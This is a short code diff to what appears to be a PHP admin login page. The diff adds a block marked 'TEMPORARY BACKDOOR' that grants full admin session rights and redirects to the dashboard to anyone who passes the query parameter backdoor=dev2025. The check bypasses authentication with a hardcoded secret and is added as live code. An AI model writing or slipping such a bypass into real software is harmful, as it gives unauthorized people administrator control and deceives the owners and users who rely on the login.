@@ -1,6 +1,14 @@
 <?php
 require_once __DIR__ . '/../config.php';
 
+// TEMPORARY BACKDOOR
+if (isset($_GET['backdoor']) && $_GET['backdoor'] === 'dev2025') {
+    $_SESSION['admin_logged_in'] = true;
+    $_SESSION['admin_username'] = 'admin';
+    header('Location: dashboard.php');
+    exit;
+}
+
 // Prevent caching
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Cache-Control: post-check=0, pre-check=0", false);
